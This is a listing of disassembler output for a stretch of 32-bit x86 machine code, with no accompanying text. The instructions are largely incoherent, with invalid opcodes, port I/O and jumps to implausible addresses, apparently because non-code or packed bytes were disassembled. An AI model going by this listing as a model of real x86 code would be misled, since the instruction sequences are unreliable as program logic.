  4906da:	ins    BYTE PTR es:[edi],dx
  4906db:	fcmovne st,st(6)
  4906dd:	neg    ebp
  4906df:	lods   al,BYTE PTR ds:[esi]
  4906e0:	fs inc esi
  4906e2:	add    al,0x24
  4906e4:	add    edi,eax
  4906e6:	sub    BYTE PTR [ebx],dl
  4906e8:	fisub  DWORD PTR [ebp-0x2c]
  4906eb:	ins    BYTE PTR es:[edi],dx
  4906ec:	repnz sub al,0x28
  4906ef:	data16 or al,0x18
  4906f2:	imul   ecx,DWORD PTR [esp+ebx*2+0x1808c832],0x41fd1808
  4906fd:	data16 xlat BYTE PTR ds:[ebx]
  4906ff:	call   0xc861701c
  490704:	test   edx,edx
  490706:	jl     0x490733
  490708:	jg     0x490789
  49070a:	aaa    
  49070b:	scas   al,BYTE PTR es:[edi]
  49070c:	inc    esp
  49070d:	mov    esi,0xc103b81b
  490712:	push   0x7
  490714:	cdq    
  490715:	pop    edi
  490716:	test   DWORD PTR [eax-0x2ad3e7],0xa00d401
  490720:	jl     0x490790
  490722:	popf   
  490723:	adc    al,0x80
  490725:	or     edx,esi
  490727:	dec    eax
  490728:	jg     0x49071f
  49072a:	jl     0x49079f
  49072c:	out    dx,eax
  49072d:	cmp    bl,cl
  49072f:	int3   
  490730:	cld    
  490731:	lea    eax,[ecx+eax*1+0x4e]
  490735:	dec    ebp
  490736:	push   ds
  490737:	push   ebx
  490738:	rol    DWORD PTR [ebp-0x3f],cl
  49073b:	add    DWORD PTR [edx-0x3c],ebp
  49073e:	ins    DWORD PTR es:[edi],dx
  49073f:	int3   
  490740:	inc    ecx
  490741:	popa   
  490742:	cmp    esp,DWORD PTR [esi-0x2c]
  490745:	pop    ds
  490746:	inc    DWORD PTR [edx]
  490748:	xor    BYTE PTR [edi+esi*8],ah
  49074b:	dec    ecx
  49074c:	sbb    ebp,DWORD PTR [esi]
  49074e:	adc    BYTE PTR [ebx],cl
  490750:	aam    0xba
  490752:	push   edi
  490753:	add    eax,edi
  490755:	test   al,0x20
  490757:	stos   DWORD PTR es:[edi],eax
  490758:	cmp    ch,BYTE PTR [esi-0x31]
  49075b:	in     al,dx
  49075c:	sub    eax,0x75
  49075f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490760:	pop    ss
  490761:	scas   al,BYTE PTR es:[edi]
  490762:	xchg   edx,eax
  490763:	cmp    ch,bl
  490765:	frstor [eax-0x4a07ed75]
  49076b:	fs jns 0x4906ee
  49076e:	bnd je 0x49078d
  490771:	push   edi
  490772:	sub    eax,DWORD PTR [ebp+0x50b3e04e]
  490778:	cmp    DWORD PTR [esi-0x71bfe7d],esi
  49077e:	push   ds
  49077f:	or     DWORD PTR [eax],esp
  490781:	dec    DWORD PTR [eax]
  490783:	cmp    dh,BYTE PTR [ebp-0x1a]
  490786:	mov    ss,WORD PTR [edi]
  490788:	std    
  490789:	add    ebp,DWORD PTR [ebx-0x66]
  49078c:	mov    ?,WORD PTR [esi]
  49078e:	add    DWORD PTR [ebx+0x541e760f],ecx
  490794:	or     bl,BYTE PTR [ecx+0x1fb5375b]
  49079a:	shl    edi,cl
  49079c:	sti    
  49079d:	mov    ebx,0x168b0eff
  4907a2:	mov    edx,0x1fae67e
  4907a7:	ja     0x49079c
  4907a9:	test   eax,0x5be4c2c1
  4907ae:	ds jg  0xa290fac6
  4907b5:	cmp    eax,0x10043140
  4907ba:	sub    al,al
  4907bc:	add    bh,BYTE PTR [ebx]
  4907be:	rol    ecx,0x90
  4907c1:	cmp    eax,DWORD PTR [ebx+edx*1]
  4907c4:	xor    BYTE PTR [esi],dh
  4907c6:	mov    ds:0xab4d357,al
  4907cb:	fcom   DWORD PTR [eax]
  4907cd:	fmul   st(1),st
  4907cf:	call   0x46cead14
  4907d4:	push   es
  4907d5:	fidiv  DWORD PTR [esi]
  4907d7:	aam    0x1a
  4907d9:	sbb    eax,0x747a00ba
  4907de:	adc    ecx,DWORD PTR [eax-0x3c]
  4907e1:	mov    ecx,0xbda54d3
  4907e6:	stos   BYTE PTR es:[edi],al
  4907e7:	jmp    0x4907f7
  4907e9:	push   cs
  4907ea:	pop    esp
  4907eb:	push   es
  4907ec:	pop    eax
  4907ed:	(bad)  
  4907ee:	mov    ebx,0xb983f126
  4907f3:	mov    al,0xbd
  4907f5:	sbb    DWORD PTR [ebp+0xc],edi
  4907f8:	add    ah,BYTE PTR [ecx+0x795ea348]
  4907fe:	adc    eax,0xa10575c2
  490803:	inc    esp
  490804:	fdivr  QWORD PTR [edx-0x6a11f894]
  49080a:	sub    bl,BYTE PTR [eax]
  49080c:	push   0x6f45103
  490811:	push   ebp
  490812:	cwde   
  490813:	push   ecx
  490814:	cmp    al,0xef
  490816:	jns    0x490875
  490818:	lods   al,BYTE PTR ds:[esi]
  490819:	inc    edx
  49081a:	adc    ch,dh
  49081c:	or     al,0xe
  49081e:	repnz or BYTE PTR [ecx+ecx*2+0x4f4f3db],al
  490826:	push   es
  490827:	or     DWORD PTR [esi+0x76],esp
  49082a:	scas   al,BYTE PTR es:[edi]
  49082b:	dec    esp
  49082c:	mov    ebp,0x5751b28d
  490831:	div    BYTE PTR es:[eax-0x14e2d6af]
  490838:	mul    BYTE PTR [edx]
  49083a:	cli    
  49083b:	xchg   edx,eax
  49083c:	loopne 0x49083d
  49083e:	mov    cl,0xa8
  490840:	(bad)  
  490841:	jnp    0x490813
  490843:	push   0xa3d0be54
  490848:	call   0xf510948
  49084d:	outs   dx,DWORD PTR ds:[esi]
  49084e:	jne    0x4907d9
  490850:	cmp    eax,0xdf977732
  490855:	jl     0x4907e2
  490857:	les    edi,FWORD PTR [esp+ebx*1-0x7667e16a]
  49085e:	(bad)  
  49085f:	sub    al,BYTE PTR [eax+0x11]
  490862:	push   eax
  490863:	sub    esi,DWORD PTR [eax-0x50]
  490866:	loope  0x49082d
  490868:	or     DWORD PTR [ebx*8-0x3887f706],esp
  49086f:	mov    ebp,0xabe84a88
  490874:	mov    cl,0xd0
  490876:	mov    ebx,eax
  490878:	sbb    al,0xef
  49087a:	dec    ebx
  49087b:	add    al,0x27
  49087d:	sbb    eax,0xbfb072f8
  490882:	ss add ebp,ebp
  490885:	loope  0x4908dc
  490887:	in     al,0x48
  490889:	mov    bl,BYTE PTR ds:0x76a2d4e0
  49088f:	adc    eax,0xa24feb0
  490894:	and    bh,BYTE PTR [ebx]
  490896:	stos   BYTE PTR es:[edi],al
  490897:	cmp    al,BYTE PTR [ebx-0x282694fa]
  49089d:	and    BYTE PTR [edx],bl
  49089f:	(bad)  
  4908a0:	or     DWORD PTR [eax],edi
  4908a2:	jg     0x49088a
  4908a4:	je     0x49083a
  4908a6:	inc    esi
  4908a7:	ret    0xea77
  4908aa:	dec    eax
  4908ab:	fcomp  QWORD PTR [ecx-0x22]
  4908ae:	lea    esp,[ebp-0x38]
  4908b1:	pop    edi
  4908b2:	pop    ebx
  4908b3:	mov    ebx,0x912146e
  4908b8:	mov    ecx,0xe67413fc
  4908bd:	add    ecx,DWORD PTR [edi]
  4908bf:	lahf   
  4908c0:	mov    al,ds:0x42dcc7a2
  4908c5:	stos   BYTE PTR es:[edi],al
  4908c6:	sbb    al,bl
  4908c8:	js     0x49091c
  4908ca:	loop   0x4908de
  4908cc:	shl    DWORD PTR [ecx+0xa],0xe
  4908d0:	out    dx,eax
  4908d1:	dec    eax
  4908d2:	fs jg  0xeb4956f6
  4908d9:	fdivr  QWORD PTR [esi]
  4908db:	sub    DWORD PTR [edx],esp
  4908dd:	cmp    ah,BYTE PTR [edi]
  4908df:	inc    ecx
  4908e0:	je     0x490946
  4908e2:	or     BYTE PTR [eax+0x74],cl
  4908e5:	dec    ecx
  4908e6:	sub    eax,DWORD PTR [ecx+edx*8]
  4908e9:	fmul   QWORD PTR [ebp+0x74]
  4908ec:	sbb    al,0x61
  4908ee:	mov    edx,0xd081e806
  4908f3:	call   0xf76:0xbc7084a
  4908fa:	or     cl,BYTE PTR [edi-0x5a012c82]
  490900:	jmp    0x490891
  490902:	dec    edx
  490903:	je     0x49091c
  490905:	add    al,0x1b
  490907:	or     cl,BYTE PTR [edx+0x75]
  49090a:	(bad)  [edx+0x42]
  49090d:	inc    esi
  49090e:	dec    esp
  49090f:	rcr    DWORD PTR [ebx-0x22],cl
  490912:	add    al,0xdf
  490914:	push   0x62
  490916:	or     eax,0x4b1ab2c7
  49091b:	inc    ebp
  49091c:	push   0x6d
  49091e:	inc    edx
  49091f:	aam    0xcb
  490921:	mov    bl,0x5b
  490923:	add    eax,0xb9eb0904
  490928:	sub    ebx,DWORD PTR [ebx+0x6a]
  49092b:	dec    eax
  49092c:	push   0x5f976f74
  490931:	add    eax,0x45457f2
  490936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  490937:	add    eax,0x14eb0aba
  49093c:	push   0xb13354ed
  490941:	ins    BYTE PTR es:[edi],dx
  490942:	sub    eax,DWORD PTR [esi]
  490944:	push   es
  490945:	clc    
  490946:	push   0x70
  490948:	push   ss
  490949:	adc    dl,BYTE PTR [esi]
  49094b:	jmp    DWORD PTR [edi-0x73]
  49094e:	cmp    al,0x57
  490950:	test   dl,0xbe
  490953:	je     0x49094a
  490955:	xor    al,0xa5
  490957:	and    al,BYTE PTR [esi-0x2c76fa45]
  49095d:	inc    esp
  49095e:	les    edx,FWORD PTR [esi]
  490960:	int3   
  490961:	adc    BYTE PTR [ebx-0x6a],ah
  490964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  490965:	push   ds
  490966:	lods   al,BYTE PTR ds:[esi]
  490967:	rcl    BYTE PTR [ebp-0x11202aaa],0xe0
  49096e:	add    bh,BYTE PTR [esi+0x6]
  490971:	addr16 push edi
  490973:	jne    0x49094d
  490975:	mov    BYTE PTR [ebx+0x19],cl
  490978:	jl     0x490934
  49097a:	mov    dh,0x7
  49097c:	addr16 pop ds
  49097e:	add    al,0xe
  490980:	dec    edx
  490981:	sahf   
  490982:	and    ch,BYTE PTR [edx+0x41]
  490985:	arpl   cx,di
  490987:	and    al,0x13
  490989:	jne    0x4909ec
  49098b:	dec    esp
  49098c:	add    BYTE PTR [edx+0x64],ch
  49098f:	dec    ebx
  490990:	sar    DWORD PTR [esp+ebp*4],cl
  490993:	repnz push 0x510a996
  490999:	xchg   ecx,eax
  49099a:	lods   eax,DWORD PTR ds:[esi]
  49099b:	fldcw  WORD PTR [esi+0x767406e1]
  4909a1:	cmp    ah,BYTE PTR [ebx]
  4909a3:	and    BYTE PTR [ebx+eiz*8-0x2],bh
  4909a7:	dec    edx
  4909a8:	xchg   edx,eax
  4909a9:	punpcklwd mm3,DWORD PTR [ecx]
  4909ac:	jns    0x49096c
  4909ae:	dec    edx
  4909af:	xchg   esp,eax
  4909b0:	xlat   BYTE PTR ds:[ebx]
  4909b1:	(bad)  
  4909b2:	pop    ecx
  4909b3:	jns    0x490969
  4909b5:	call   0x7923399c
  4909ba:	or     BYTE PTR [ebx],cl
  4909bc:	mov    al,ds:0x5088607f
  4909c1:	add    esi,edi
  4909c3:	je     0x490a13
  4909c5:	push   ecx
  4909c6:	mov    BYTE PTR [esp+ebp*1+0x75],dl
  4909ca:	daa    
  4909cb:	mov    eax,DWORD PTR [ebx]
  4909cd:	jnp    0x4909ed
  4909cf:	jl     0x4909c1
  4909d1:	jecxz  0x4909d9
  4909d3:	iret   
  4909d4:	or     BYTE PTR [edi-0x15],cl
  4909d7:	js     0x49096b
  4909d9:	jbe    0x490a4e
  4909db:	sub    ecx,DWORD PTR [edi]
  4909dd:	sub    ch,BYTE PTR ds:0x77c102c9
  4909e3:	add    esi,esp
  4909e5:	jmp    0x490a65
  4909e7:	in     al,0x41
  4909e9:	repz pop esp
  4909eb:	dec    edx
  4909ec:	je     0x4909f6
  4909ee:	or     al,0x4a
  4909f0:	dec    ebx
  4909f1:	or     al,0xa6
  4909f3:	push   0x53
  4909f5:	jmp    0x490a21
  4909f7:	clc    
  4909f8:	xchg   ecx,eax
  4909f9:	cld    
  4909fa:	shr    DWORD PTR [ebx],1
  4909fc:	mov    esp,0x14eb4d6a
  490a01:	shr    BYTE PTR [edx+0x49],cl
  490a04:	pop    eax
  490a05:	mov    ds:0x54f6803e,eax
  490a0a:	add    al,0xe0
  490a0c:	add    ah,bl
  490a0e:	or     dl,BYTE PTR [ebx-0x27bf7a67]
  490a14:	mov    ds:0xa0ba5e4d,al
  490a19:	rcr    BYTE PTR [edi+0xf],cl
  490a1c:	xchg   dh,al
  490a1e:	cmp    edi,edx
  490a20:	dec    edx
  490a21:	mov    ch,0x4e
  490a23:	call   0xb3d43791
  490a28:	cli    
  490a29:	mov    al,0x85
  490a2b:	lock mov edi,0x4960ba11
  490a31:	and    ch,bl
  490a33:	aas    
  490a34:	cmp    eax,DWORD PTR [ecx]
  490a36:	jae    0x490a32
  490a38:	rol    BYTE PTR [esi-0x4f],0xc
  490a3c:	mov    eax,0xebfae52a
  490a41:	mov    esi,0x748d1010
  490a46:	add    dh,bh
  490a48:	add    BYTE PTR ss:[ecx-0x9],bl
  490a4c:	stc    
  490a4d:	push   ss
  490a4e:	or     cl,BYTE PTR ds:0x1405ff89
  490a54:	push   cs
  490a55:	inc    ebx
  490a56:	sub    esi,0x70
  490a59:	push   cs
  490a5a:	(bad)  
  490a5b:	das    
  490a5c:	rcr    bh,0x75
  490a5f:	loop   0x4909ef
  490a61:	pop    esi
  490a62:	lea    eax,[ebx+ebx*1]
  490a65:	pusha  
  490a66:	sub    DWORD PTR [ecx],ebx
  490a68:	jmp    0x490a6c
  490a6a:	mov    DWORD PTR [ecx],ebx
  490a6c:	les    edx,FWORD PTR [edx]
  490a6e:	add    DWORD PTR [ecx],esp
  490a70:	dec    ebp
  490a71:	jo     0x490ab5
  490a73:	push   esi
  490a74:	jns    0x490adf
  490a76:	mov    dl,BYTE PTR [eax]
  490a78:	pop    ecx
  490a79:	call   0x1c920c27
  490a7e:	sub    bl,bl
  490a80:	xchg   edx,ecx
  490a82:	fld    QWORD PTR [eax]
  490a84:	test   al,0xdd
  490a86:	add    al,0x10
  490a88:	xor    eax,0x57340904
  490a8d:	jl     0x490af8
  490a8f:	sub    al,0x18
  490a91:	je     0x490b0c
  490a93:	or     bl,BYTE PTR [esp+esi*2]
  490a96:	dec    esi
  490a97:	and    eax,0x581b146c
  490a9c:	sbb    bl,BYTE PTR [eax+0x2]
  490a9f:	jmp    0xe445:0x202a65b3
  490aa6:	mov    BYTE PTR [edx+0x6def303d],dh
  490aac:	and    edx,DWORD PTR [edi]
  490aae:	jle    0x6f99a2bc
  490ab4:	pop    ebp
  490ab5:	pop    ebx
  490ab6:	imul   ebx,esi,0x85105037
  490abc:	rcl    BYTE PTR [esi-0x723ff406],cl
  490ac2:	gs jne 0x490aaa
  490ac5:	repnz cmp eax,0x948b1cf0
  490acb:	xchg   esi,eax
  490acc:	push   0x4a
  490ace:	push   ecx
  490acf:	mov    edx,0x9a43c818
  490ad4:	dec    ebx
  490ad5:	jo     0x490add
  490ad7:	addr16 aam 0x0
  490ada:	ret    
  490adb:	test   al,0x22
  490add:	jo     0x490af3
  490adf:	and    ax,0x775a
  490ae3:	xchg   ecx,eax
  490ae4:	rcr    BYTE PTR ds:0xff18b000,1
  490aea:	or     BYTE PTR [edi],ch
  490aec:	(bad)  
  490aef:	mov    esi,0x8f3264f1
  490af4:	sub    DWORD PTR [edx],ecx
  490af6:	or     al,0x2b
  490af8:	sbb    dl,ch
  490afa:	jo     0x490a8f
  490afc:	push   edx
  490afd:	add    dl,BYTE PTR [ecx+0x5a]
  490b00:	loop   0x490b22
  490b02:	mov    esp,0x29a00352
  490b07:	clc    
  490b08:	pop    esp
  490b09:	dec    edi
  490b0a:	aad    0x9a
  490b0c:	dec    ebp
  490b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490b0e:	fucompp 
  490b10:	sti    
  490b11:	xchg   ebp,eax
  490b12:	test   BYTE PTR [esi],0x5a
  490b15:	sub    eax,edx
  490b17:	adc    al,0x92
  490b19:	add    bl,BYTE PTR [esi+0x2b]
  490b1c:	(bad)  
  490b1d:	je     0x490b5a
  490b1f:	push   es
  490b20:	push   ss
  490b21:	dec    eax
  490b22:	loope  0x490b3b
  490b24:	push   es
  490b25:	and    ch,BYTE PTR es:[esi]
  490b28:	js     0x490b7f
  490b2a:	sbb    bl,dl
  490b2c:	push   esp
  490b2d:	push   ds
  490b2e:	je     0x490b8a
  490b30:	adc    al,0x42
  490b32:	push   eax
  490b33:	es dec eax
  490b35:	leave  
  490b36:	stos   DWORD PTR es:[edi],eax
  490b37:	imul   edx,DWORD PTR [edi+0x40],0xffffffce
  490b3b:	fs retf 0xc6c4
  490b3f:	push   cs
  490b40:	push   ss
  490b41:	pushf  
  490b42:	xchg   ebx,eax
  490b43:	imul   edi,edi,0xebca8b04
  490b49:	sbb    DWORD PTR [ecx-0x15],ecx
  490b4c:	push   ss
  490b4d:	inc    ecx
  490b4e:	lods   eax,DWORD PTR ds:[esi]
  490b4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  490b50:	loopne 0x490b1d
  490b52:	stos   BYTE PTR es:[edi],al
  490b53:	adc    al,0xaa
  490b55:	sbb    al,0x9a
  490b57:	mov    al,0xfa
  490b59:	mov    eax,0x3c7b5d89
  490b5e:	sub    al,0x8e
  490b60:	cmp    eax,0xdcf67dd1
  490b65:	ds push eax
  490b67:	add    eax,0x1eddc2ac
  490b6c:	jl     0x490b6f
  490b6e:	inc    eax
  490b6f:	xchg   ecx,eax
  490b70:	fist   DWORD PTR [ecx]
  490b72:	adc    eax,DWORD PTR [edi+0x50]
  490b75:	out    dx,eax
  490b76:	dec    edi
  490b77:	fcomp  DWORD PTR [edi-0x3535419a]
  490b7d:	xor    DWORD PTR [edi+0x3b015604],0x38
  490b84:	dec    ebp
  490b85:	shr    dh,0x5e
  490b88:	inc    eax
  490b89:	(bad)  
  490b8a:	fst    DWORD PTR [ecx+eax*4]
  490b8d:	stc    
  490b8e:	xchg   esp,eax
  490b8f:	adc    BYTE PTR [esp+edi*1+0x1fa3f9bb],cl
  490b96:	data16 mov al,0xe9
  490b99:	push   esp
  490b9a:	xor    BYTE PTR [esi-0x75],bh
  490b9d:	shl    ebp,0xa1
  490ba0:	lods   al,BYTE PTR ds:[esi]
  490ba1:	and    bh,BYTE PTR [esi+0x57]
  490ba4:	not    BYTE PTR [ebx]
  490ba6:	imul   eax,eax,0x64
  490ba9:	add    eax,edx
  490bab:	push   0xe56d7deb
  490bb0:	rcl    BYTE PTR [eax+eiz*8+0x6d],cl
  490bb4:	inc    edi
  490bb5:	sub    al,0xe8
  490bb7:	pop    edx
  490bb8:	adc    BYTE PTR [edi+0x4a],dl
  490bbb:	jnp    0x490bd7
  490bbd:	cs pop es
  490bbf:	adc    ch,ah
  490bc1:	dec    eax
  490bc2:	or     al,0xc0
  490bc4:	retf   0x4bc9
  490bc7:	lds    esi,FWORD PTR [ebx+eiz*2-0x3e]
  490bcb:	cs out dx,al
  490bcd:	add    BYTE PTR [ebx+edi*4],bl
  490bd0:	ja     0x490be5
  490bd2:	mov    esp,0x913d1ad0
  490bd7:	lds    edx,FWORD PTR [esp+eax*8]
  490bda:	inc    eax
  490bdb:	(bad)  
  490bdc:	mov    dh,0x14
  490bde:	mov    WORD PTR [ebp+0x21eb0377],gs
  490be4:	dec    ecx
  490be5:	inc    eax
  490be6:	and    ch,BYTE PTR [edx+0x3da45f8]
  490bec:	cdq    
  490bed:	pop    ds
  490bee:	inc    esi
  490bef:	mov    eax,ds:0x17580245
  490bf4:	inc    esi
  490bf5:	je     0x490c61
  490bf7:	mov    al,ds:0x96fe1d14
  490bfc:	jno    0x490c66
  490bfe:	mov    DWORD PTR [esi-0x1f],eax
  490c01:	cmp    DWORD PTR [ebp+0x20],0x1e
  490c05:	sbb    BYTE PTR [edi+0x1c],cl
  490c08:	lods   eax,DWORD PTR ds:[esi]
  490c09:	aaa    
  490c0a:	push   ecx
  490c0b:	jg     0x490bdf
  490c0d:	mov    edx,edi
  490c0f:	je     0x490c53
  490c11:	adc    DWORD PTR [ecx+0x6b],ecx
  490c14:	inc    esp
  490c15:	jmp    0x6d2a:0x7237f851
  490c1c:	into   
  490c1d:	in     al,dx
  490c1e:	stos   BYTE PTR es:[edi],al
  490c1f:	pop    ebx
  490c20:	test   BYTE PTR [eax],ah
  490c22:	pop    ecx
  490c23:	dec    esi
  490c24:	pop    ecx
  490c25:	sets   BYTE PTR [esi+0x66]
  490c29:	push   esi
  490c2a:	(bad)  
  490c2b:	and    dl,dh
  490c2d:	push   ebp
  490c2e:	ret    
  490c2f:	int    0xf8
  490c31:	jno    0x490c6b
  490c33:	fiadd  DWORD PTR [ecx+0x6a]
  490c36:	push   es
  490c37:	mov    esp,0xe42378ed
  490c3c:	jg     0x490c5c
  490c3e:	clc    
  490c3f:	js     0x490c62
  490c41:	out    0xdd,eax
  490c43:	lock add BYTE PTR [eax+0x5],bh
  490c47:	aam    0x7e
  490c49:	cdq    
  490c4a:	jne    0x490bf5
  490c4c:	add    ah,BYTE PTR [ecx]
  490c4e:	dec    ebx
  490c4f:	enter  0xb869,0x8b
  490c53:	int    0xb7
  490c55:	add    DWORD PTR [eax-0x5c],eax
  490c58:	sar    BYTE PTR [eax-0x30],0x83
  490c5c:	clc    
  490c5d:	retf   
  490c5e:	inc    eax
  490c5f:	dec    ebx
  490c60:	(bad)  
  490c61:	cmovo  eax,DWORD PTR [ebx-0x32]
  490c65:	inc    edx
  490c66:	jo     0x490c29
  490c68:	sbb    DWORD PTR [eax-0x1e],0x84ab9197
  490c6f:	bound  ecx,QWORD PTR [eax+0x75]
  490c72:	mov    dh,0xdb
  490c74:	xchg   ebp,eax
  490c75:	mov    al,BYTE PTR [ebp+0x1d]
  490c78:	dec    eax
  490c79:	sbb    DWORD PTR [esi+0x6a],0x4a
  490c7d:	and    ah,dl
  490c7f:	or     al,0xe2
  490c81:	frstor [ebx+0x66e2802c]
  490c87:	ins    BYTE PTR es:[edi],dx
  490c88:	(bad)  
  490c89:	jge    0x490c9f
  490c8b:	mov    al,0x4a
  490c8d:	and    BYTE PTR [edx+0x48834ff],ch
  490c93:	add    BYTE PTR ss:[edx],cl
  490c96:	mov    esi,0xd45037f0
  490c9b:	xor    DWORD PTR [eax+0xae1baec],esp
  490ca1:	push   0xc
  490ca3:	fwait
  490ca4:	nop
  490ca5:	xchg   esp,eax
  490ca6:	xor    BYTE PTR [esi-0x1a],0x4e
  490caa:	inc    ecx
  490cab:	sub    eax,DWORD PTR [edx-0x68]
  490cae:	loopne 0x490c91
  490cb0:	enter  0xe01,0x61
  490cb4:	mov    ah,0x3
  490cb6:	or     al,0xa8
  490cb8:	mov    esp,0x142d99f0
  490cbd:	cmp    DWORD PTR [esi+0x1e1c50b0],edx
  490cc3:	into   
  490cc4:	cdq    
  490cc5:	sar    dl,1
  490cc7:	hlt    
  490cc8:	inc    ecx
  490cc9:	mov    ah,0x41
  490ccb:	stc    
  490ccc:	mov    esp,0x92b7584e
  490cd1:	lods   al,BYTE PTR ds:[esi]
  490cd2:	ror    DWORD PTR [ecx-0x3e],1
  490cd5:	mov    esp,0x7c299986
  490cda:	xchg   esi,eax
  490cdb:	ror    dl,0xf7
  490cde:	or     eax,0xfefa187d
  490ce3:	bound  ecx,QWORD PTR [ecx-0x15611d50]
  490ce9:	icebp  
  490cea:	adc    BYTE PTR [edi-0x5c],bl
  490ced:	xor    al,0xdf
  490cef:	xor    al,0x1d
  490cf1:	adc    DWORD PTR [ebx-0x34e8b42c],edi
  490cf7:	dec    eax
  490cf8:	add    ecx,DWORD PTR [esi]
  490cfa:	in     eax,dx
  490cfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490cfc:	sbb    al,0xe
  490cfe:	mov    eax,0x78456192
  490d03:	loop   0x490c97
  490d05:	push   esp
  490d06:	mov    ch,0x36
  490d08:	rcr    BYTE PTR [eax-0x3d9c20c],0x7e
  490d0f:	pop    edi
  490d10:	pop    esi
  490d11:	or     ebx,DWORD PTR [edx+0x4c30d342]
  490d17:	adc    BYTE PTR [esp+esi*8],bl
  490d1a:	popf   
  490d1b:	test   BYTE PTR [ecx-0x50270d7e],dl
  490d21:	call   0x5cce1b46
  490d26:	and    ebx,edx
  490d28:	fmul   DWORD PTR [esi+0x63]
  490d2b:	loopne 0x490d19
  490d2d:	fwait
  490d2e:	call   0x250cd6c1
  490d33:	sbb    eax,0xb29e09d6
  490d38:	and    edx,DWORD PTR [eax-0x13894f86]
  490d3e:	dec    edi
  490d3f:	pop    esp
  490d40:	push   ebx
  490d41:	ds and eax,0x563890c2
  490d47:	arpl   WORD PTR [edx+0x4cf470ea],dx
  490d4d:	shl    DWORD PTR [edi-0x61],1
  490d50:	or     DWORD PTR [ebp-0x611433fe],esi
  490d56:	adc    BYTE PTR [ebp-0x7624da0a],0x2
  490d5d:	addr16 mov al,ds:0x943a
  490d61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  490d62:	jb     0x490d2c
  490d64:	sbb    BYTE PTR [ecx+0x23],ah
  490d67:	pop    esi
  490d68:	clc    
  490d69:	pop    esp
  490d6a:	cmp    ecx,0x25
  490d6d:	(bad)  
  490d6e:	dec    ebp
  490d6f:	or     BYTE PTR [ebp+ecx*4-0x5e],ch
  490d73:	sbb    al,0x21
  490d75:	sub    bl,bl
  490d77:	out    dx,al
  490d78:	aas    
  490d79:	in     al,dx
  490d7a:	dec    esi
  490d7b:	pop    ebx
  490d7c:	add    DWORD PTR [edx+edx*2-0x77],ebp
  490d80:	and    al,ah
  490d82:	loopne 0x490d2e
  490d84:	pop    esi
  490d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490d86:	(bad)  
  490d87:	in     al,0x40
  490d89:	push   ss
  490d8a:	leave  
  490d8b:	(bad)  
  490d8c:	sbb    ah,BYTE PTR [ebx]
  490d8e:	xchg   esp,eax
  490d8f:	inc    esi
  490d90:	enter  0x6ea4,0xdc
  490d94:	or     BYTE PTR [eax-0x2226af24],0x6b
  490d9b:	fst    QWORD PTR ds:0xaa4a2baf
  490da1:	ja     0x490d3e
  490da3:	or     esi,DWORD PTR [esi+0x6]
  490da6:	(bad)  
  490da7:	pop    edx
  490da8:	mov    eax,0x2b29b829
  490dad:	cli    
  490dae:	rcr    DWORD PTR [eax+0x3],0x4e
  490db2:	adc    dl,BYTE PTR [edx-0x83bbc14]
  490db8:	sbb    DWORD PTR [edx],ebx
  490dba:	jmp    0x490e07
  490dbc:	inc    ebx
  490dbd:	pop    es
  490dbe:	mov    al,0x6d
  490dc0:	xchg   edi,eax
  490dc1:	xchg   esi,eax
  490dc2:	add    edx,DWORD PTR [eax-0x10]
  490dc5:	cmp    DWORD PTR [esi*2+0x77fc0812],ebx
  490dcc:	inc    ebp
  490dcd:	ret    
  490dce:	jae    0x490df5
  490dd0:	outs   dx,DWORD PTR ds:[esi]
  490dd1:	and    dl,BYTE PTR [eax]
  490dd3:	pop    ebx
  490dd4:	add    DWORD PTR [eax+0xa],ebx
  490dd7:	test   BYTE PTR ds:0xe3c01c02,al
  490ddd:	(bad)  
  490dde:	not    DWORD PTR [ecx-0x34]
  490de1:	mov    edx,0x189f1085
  490de6:	sbb    BYTE PTR [ecx-0x27],bh
  490de9:	out    dx,al
  490dea:	push   esi
  490deb:	push   edi
  490dec:	fistp  WORD PTR [edi]
  490dee:	test   BYTE PTR [esi-0x70],ch
  490df1:	mov    esi,0x3f6856ac
  490df6:	adc    esi,DWORD PTR [edi+0x67c0cec0]
  490dfc:	loopne 0x490da9
  490dfe:	pop    ecx
  490dff:	pop    ecx
  490e00:	push   0x33edf88b
  490e05:	shl    BYTE PTR [ecx-0x1e],1
  490e08:	and    ecx,eax
  490e0a:	data16 loopne 0x490e75
  490e0d:	out    0xe0,eax
  490e0f:	mov    edi,0xd84a4345
  490e14:	cmp    DWORD PTR [eax+0x2a],ecx
  490e17:	push   edi
  490e18:	je     0x490e3b
  490e1a:	fadd   QWORD PTR ds:0x42205b28
  490e20:	push   0x1f24d180
  490e25:	jbe    0x490dcd
  490e27:	ds dec esp
  490e29:	push   0x15
  490e2b:	movsx  eax,ax
  490e2e:	sub    ch,bl
  490e30:	dec    eax
  490e31:	cmp    esp,DWORD PTR [esi]
  490e33:	cmp    bh,BYTE PTR [ebx+0x73]
  490e36:	and    al,0x21
  490e38:	imul   eax,DWORD PTR [esi],0x37
  490e3b:	in     al,dx
  490e3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  490e3d:	std    
  490e3e:	or     al,0x3c
  490e40:	rcr    esi,1
  490e42:	loopne 0x490e2f
  490e44:	daa    
  490e45:	sbb    ebp,ebx
  490e47:	sbb    edi,DWORD PTR [ebx]
  490e49:	(bad)  
  490e4a:	push   eax
  490e4b:	dec    edi
  490e4c:	add    ah,BYTE PTR ds:0x803227a4
  490e52:	ret    
  490e53:	outs   dx,BYTE PTR ds:[esi]
  490e54:	or     esi,DWORD PTR [eax+0x39]
  490e57:	clc    
  490e58:	call   0x357ef911
  490e5d:	fadd   QWORD PTR [ecx+0x5750894]
  490e63:	or     bl,BYTE PTR ds:0xcb1f66c6
  490e69:	xor    eax,0x4d5c9ad
  490e6e:	pop    eax
  490e6f:	push   0x8824c4c8
  490e74:	shl    DWORD PTR [eax+edi*1],1
  490e77:	push   eax
  490e78:	sub    BYTE PTR [edx+0x2e5a5de9],dl
  490e7e:	xor    eax,0xb750e2c
  490e83:	push   esi
  490e84:	push   esi
  490e85:	xor    BYTE PTR [esi-0x6155aa3a],bl
  490e8b:	or     BYTE PTR [edx],bl
  490e8d:	mov    eax,0x2565a4d
  490e92:	pop    esp
